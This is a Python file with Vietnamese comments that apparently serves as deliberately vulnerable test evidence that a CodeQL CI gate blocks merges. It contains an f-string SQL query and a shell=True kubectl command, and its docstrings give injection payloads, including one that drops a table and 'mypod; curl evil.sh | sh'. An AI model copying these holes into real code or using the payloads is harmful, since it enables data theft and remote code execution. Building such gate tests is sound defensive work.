# ============================================================================ #
# FILE CỐ TÌNH CÓ LỖ HỔNG — DÙNG LÀM EVIDENCE CHO DIRECTIVE #10                #
#                                                                              #
# KHÔNG MERGE. KHÔNG COPY. File này tồn tại để chứng minh một điều duy nhất:   #
# gate `SAST (codeql)` là cổng chặn THẬT, không phải cái nhãn xanh trang trí.  #
#                                                                              #
# Yêu cầu của directive là "mở PR với CI cố tình đỏ → phải bị chặn merge".     #
# Muốn chứng minh thì phải có PR đỏ thật, trên repo thật, chạm ruleset thật.   #
# Đọc bằng chứng CI xanh thì không ai biết cổng có mở toang hay không.         #
#                                                                              #
# Hai lỗ dưới đây đều nằm trong bộ query mặc định của CodeQL cho Python:       #
#   py/sql-injection            — ghép chuỗi do người dùng nhập vào câu SQL    #
#   py/command-line-injection   — ghép chuỗi do người dùng nhập vào lệnh shell #
# ============================================================================ #
import os
import sqlite3
import subprocess
import sys

DB_PATH = os.environ.get("AIOPS_INCIDENT_DB", "incidents.db")


def find_incident(service_name):
    """Tra sự cố gần nhất của một service.

    LỖ HỔNG 1 — py/sql-injection.
    `service_name` đi thẳng từ tay người gọi vào câu SQL qua f-string. Ai gọi
    hàm này với chuỗi `x' OR '1'='1` sẽ đọc được toàn bộ bảng; với `x'; DROP
    TABLE incidents; --` thì mất bảng.

    Cách viết đúng là truyền tham số rời để driver tự escape:
        cur.execute("SELECT ... WHERE service = ?", (service_name,))
    """
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    query = f"SELECT id, service, severity, summary FROM incidents WHERE service = '{service_name}' ORDER BY id DESC LIMIT 10"
    cur.execute(query)

    rows = cur.fetchall()
    conn.close()
    return rows


def collect_pod_logs(pod_name):
    """Lấy log của một pod để đính vào báo cáo sự cố.

    LỖ HỔNG 2 — py/command-line-injection.
    `shell=True` cộng với chuỗi ghép nghĩa là shell diễn giải cả nội dung
    `pod_name`. Truyền `mypod; curl evil.sh | sh` là chạy được lệnh tuỳ ý dưới
    quyền của tiến trình này — trên runner CI thì đó là quyền chạm vào token.

    Cách viết đúng là bỏ shell đi, truyền danh sách tham số:
        subprocess.run(["kubectl", "logs", pod_name, "--tail", "200"], check=True)
    """
    cmd = "kubectl logs " + pod_name + " --tail 200"
    return subprocess.check_output(cmd, shell=True).decode()


if __name__ == "__main__":
    for row in find_incident(sys.argv[1]):
        print(row)
